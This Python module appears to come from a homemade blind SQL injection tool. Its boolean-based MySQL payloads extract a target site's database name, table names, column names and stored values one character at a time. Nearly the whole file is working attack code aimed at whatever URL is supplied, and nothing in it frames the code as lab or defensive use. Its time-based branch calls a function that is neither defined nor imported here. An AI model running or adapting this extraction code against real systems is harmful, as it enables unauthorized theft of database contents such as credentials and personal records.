import time
from Modules.RequestHandler import send_payload
from Modules.ResponseAnalyzer import analyze_response
from Modules.URLUtils import construct_test_url


def prompt_user(vulnerability_type):
    while True:
        proceed = input(f"{vulnerability_type} vulnerability detected! Proceed with exploitation? (y/n): ").lower()
        if proceed in ["y", "n"]:
            return proceed == "y"
        else:
            print("Invalid input. Please enter 'y' or 'n'.")


def exploit_boolean_based(default_response, target_url, id_value, exploitable_payload):
    length = 1
    while True:
        insertion_payload = f'IF((SELECT+LENGTH(DATABASE()))={length},1,2)%23'
        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)
        response = send_payload(test_url)

        if analyze_response(default_response, response, updated_payload):
            print(f"\nDatabase name length found: {length}\n")
            return length

        length += 1
        print(length)


def find_database_name(target_url, id_value, db_length, default_response, exploitable_payload):
    database_name = ""

    for i in range(1, db_length + 1):
        for ascii_code in range(32, 127):

            ascii_char = chr(ascii_code)
            insertion_payload = f"IF((SELECT+SUBSTRING(DATABASE(), {i}, 1))='{ascii_char}',1,2)%23"
            updated_payload = exploitable_payload[:-4] + insertion_payload
            test_url = construct_test_url(target_url, id_value, updated_payload)
            response = send_payload(test_url)

            if analyze_response(default_response, response, updated_payload):  # boolean-based true condition
                database_name += ascii_char
                print(f"Found character at position {i}: {ascii_char}\n")
                print(f"Database name: {database_name}\n")
                break
            print(ascii_char)
    return database_name


def find_table_count(target_url, id_value, default_response, exploitable_payload):
    table_count = 1  # Start with the assumption of 1 table
    max_attempts = 100  # Limit to prevent infinite loops

    while True:
        # Construct payload to check if there are exactly `table_count` tables
        insertion_payload = f"IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())={table_count},1,2)%23"
        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)
        response = send_payload(test_url)

        if analyze_response(default_response, response, updated_payload):
            print(f"Found number of tables: {table_count}\n")
            return table_count

        # Increment table count for next test
        table_count += 1

        # Safety break to avoid infinite loop if no match is found
        if table_count > max_attempts:
            print("Reached maximum attempts, exiting.")
            break

    # If the loop exits without finding the count
    print("Unable to determine the number of tables.")
    return None


def find_table_names(target_url, id_value, table_count, default_response, exploitable_payload):
    table_names = []

    for table_index in range(table_count):
        current_table_name = ""

        for i in range(1, 51):
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE"
                                     f"+TABLE_SCHEMA=DATABASE()+LIMIT+{table_index},1), {i}, 1))='{ascii_char}',1,"
                                     f"2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_table_name += ascii_char
                    print(f"Found character at position {i} of table {table_index + 1}: {ascii_char}\n")
                    print(f"current table name: {current_table_name}")
                    break
                print(ascii_char)
            else:
                # No more characters found for this table
                break

        table_names.append(current_table_name)
        print(f"Found table {table_index + 1}: {current_table_name}\n")

    print(f"All found table names: {table_names}\n")
    return table_names


def find_table_columns(target_url, id_value, table_name, default_response, exploitable_payload):
    columns = []
    column_index = 0

    while True:
        current_column_name = ""

        for i in range(1, 51):
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+"
                                     f"WHERE+TABLE_NAME='{table_name}'+LIMIT+{column_index},1), {i}, 1))='{ascii_char}',1,2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_column_name += ascii_char
                    print(f"Found character at position {i} of column {column_index + 1}: {ascii_char}\n")
                    found_char = True
                    print(f"current column name: {current_column_name}")
                    break
                print(ascii_char)
            if not found_char:
                break

        if not current_column_name:
            # No more columns found for this table
            break

        columns.append(current_column_name)
        print(f"Found column {column_index + 1}: {current_column_name}")
        column_index += 1

    return columns


def prompt_user_and_find_columns(target_url, id_value, table_names, default_response, exploitable_payload):
    while True:
        print("Available tables:")
        for idx, table in enumerate(table_names):
            print(f"{idx + 1}: {table}")

        try:
            table_index = int(input("Choose a table by number: ")) - 1
            if 0 <= table_index < len(table_names):
                selected_table = table_names[table_index]
                print(f"Selected table: {selected_table}")

                columns = find_table_columns(target_url, id_value, selected_table, default_response,
                                             exploitable_payload)
                prompt_user_and_find_values(target_url, id_value, selected_table, columns, default_response,
                                            exploitable_payload)
                break
            else:
                print("Invalid selection. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")


def prompt_user_and_find_values(target_url, id_value, table_name, columns, default_response, exploitable_payload):
    while True:
        print(f"Available columns in table '{table_name}':")
        for idx, column in enumerate(columns):
            print(f"{idx + 1}: {column}")

        try:
            column_index = int(input("Choose a column by number: ")) - 1
            if 0 <= column_index < len(columns):
                selected_column = columns[column_index]
                print(f"Selected column: {selected_column}\n")

                find_column_values(target_url, id_value, table_name, selected_column, default_response, exploitable_payload)
                break
            else:
                print("Invalid selection. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")


def find_column_values(target_url, id_value, table_name, column_name, default_response, exploitable_payload):
    values = []
    value_index = 0

    while True:
        current_value = ""

        for i in range(1, 51):
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+{column_name}+FROM+{table_name}+"
                                     f"LIMIT+{value_index},1), {i}, 1))='{ascii_char}',1,2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_value += ascii_char
                    print(f"Found character at position {i} of value {value_index + 1}: {ascii_char}\n")
                    found_char = True
                    print(f"current value: {current_value}")
                    break
                print(ascii_char)
            if not found_char:
                break

        if not current_value:
            # No more values found for this column
            break

        values.append(current_value)
        print(f"Found value {value_index + 1}: {current_value}")
        value_index += 1

    print(f"All found values for column '{column_name}' in table '{table_name}': {values}")
    return values


def start_exploitation(default_response, target_url, id_value, method, exploitable_payload):
    if method == "boolean":
        db_length = exploit_boolean_based(default_response, target_url, id_value, exploitable_payload)
        db_name = find_database_name(target_url, id_value, db_length, default_response, exploitable_payload)
        table_count = find_table_count(target_url, id_value, default_response, exploitable_payload)
        table_names = find_table_names(target_url, id_value, table_count, default_response, exploitable_payload)
        prompt_user_and_find_columns(target_url, id_value, table_names, default_response, exploitable_payload)

    elif method == "time-based":
        if prompt_user("Time-based"):
            exploit_time_based(target_url, id_value, exploitable_payload)
    else:
        print("Invalid method specified. Please use 'boolean' or 'time-based'.")
